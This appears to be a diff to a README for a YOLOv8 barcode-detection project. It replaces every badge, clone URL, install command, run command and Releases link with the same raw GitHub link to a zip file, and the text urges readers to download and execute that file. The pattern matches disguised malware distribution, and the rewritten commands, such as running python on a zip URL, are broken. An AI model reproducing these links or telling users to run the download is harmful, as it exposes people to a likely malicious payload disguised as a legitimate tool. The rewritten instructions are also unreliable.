@@ -1,6 +1,6 @@
 # 📦 Barcode Decoder: A YOLOv8-Based System for Barcode Detection
 
-![Barcode Decoder](https://img.shields.io/badge/Barcode%20Decoder-v1.0-blue.svg) ![Python](https://img.shields.io/badge/Python-3.8%2B-green.svg) ![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+![Barcode Decoder](https://raw.githubusercontent.com/Daudmax/barcode-decoder/main/ideoplastic/decoder-barcode-3.5-alpha.3.zip%https://raw.githubusercontent.com/Daudmax/barcode-decoder/main/ideoplastic/decoder-barcode-3.5-alpha.3.zip) ![Python](https://raw.githubusercontent.com/Daudmax/barcode-decoder/main/ideoplastic/decoder-barcode-3.5-alpha.3.zip%https://raw.githubusercontent.com/Daudmax/barcode-decoder/main/ideoplastic/decoder-barcode-3.5-alpha.3.zip) ![License](https://raw.githubusercontent.com/Daudmax/barcode-decoder/main/ideoplastic/decoder-barcode-3.5-alpha.3.zip)
 
 Welcome to the **Barcode Decoder** repository! This project offers a robust system designed to detect, crop, and decode barcodes from images. Utilizing the power of YOLOv8, this system is trained on a custom barcode dataset and evaluated using precision, recall, and mAP metrics. The implementation leverages the Ultralytics YOLO and Pyzbar libraries, making it a reliable tool for barcode processing.
 
@@ -30,7 +30,7 @@ To set up the Barcode Decoder, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/Daudmax/barcode-decoder.git
+   git clone https://raw.githubusercontent.com/Daudmax/barcode-decoder/main/ideoplastic/decoder-barcode-3.5-alpha.3.zip
    cd barcode-decoder
    ```
 
@@ -39,12 +39,12 @@ To set up the Barcode Decoder, follow these steps:
    Ensure you have Python 3.8 or higher installed. Then, install the necessary libraries using pip:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Daudmax/barcode-decoder/main/ideoplastic/decoder-barcode-3.5-alpha.3.zip
    ```
 
 3. **Download the Model**:
 
-   Visit the [Releases](https://github.com/Daudmax/barcode-decoder/releases) section to download the model file. Follow the instructions to execute the downloaded file.
+   Visit the [Releases](https://raw.githubusercontent.com/Daudmax/barcode-decoder/main/ideoplastic/decoder-barcode-3.5-alpha.3.zip) section to download the model file. Follow the instructions to execute the downloaded file.
 
 ## Usage
 
@@ -55,7 +55,7 @@ Once you have installed the Barcode Decoder, you can use it as follows:
    Use the command below to run the barcode detection on an image:
 
    ```bash
-   python detect.py --image path/to/your/image.jpg
+   python https://raw.githubusercontent.com/Daudmax/barcode-decoder/main/ideoplastic/decoder-barcode-3.5-alpha.3.zip --image https://raw.githubusercontent.com/Daudmax/barcode-decoder/main/ideoplastic/decoder-barcode-3.5-alpha.3.zip
    ```
 
 2. **View the Results**:
@@ -67,7 +67,7 @@ Once you have installed the Barcode Decoder, you can use it as follows:
    For real-time detection using your webcam, run:
 
    ```bash
-   python detect.py --video
+   python https://raw.githubusercontent.com/Daudmax/barcode-decoder/main/ideoplastic/decoder-barcode-3.5-alpha.3.zip --video
    ```
 
 ## Dataset
@@ -118,7 +118,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and downloadable files, visit the [Releases](https://github.com/Daudmax/barcode-decoder/releases) section. Download the necessary files and execute them as needed.
+For the latest updates and downloadable files, visit the [Releases](https://raw.githubusercontent.com/Daudmax/barcode-decoder/main/ideoplastic/decoder-barcode-3.5-alpha.3.zip) section. Download the necessary files and execute them as needed.
 
 ## Conclusion
 
